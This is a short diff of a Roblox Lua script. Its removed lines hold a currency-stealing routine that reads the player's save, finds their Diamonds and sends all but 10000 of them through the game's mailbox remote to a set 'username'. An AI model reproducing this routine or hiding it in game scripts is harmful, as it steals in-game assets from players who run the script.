@@ -161,22 +161,7 @@ task.wait(2)
 
 
 
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
 
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        local args = {
-            [1] = username,
-            [2] = v.id,
-            [3] = "Currency",
-            [4] = i,
-            [5] = v._am - 10000
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
 
  
 
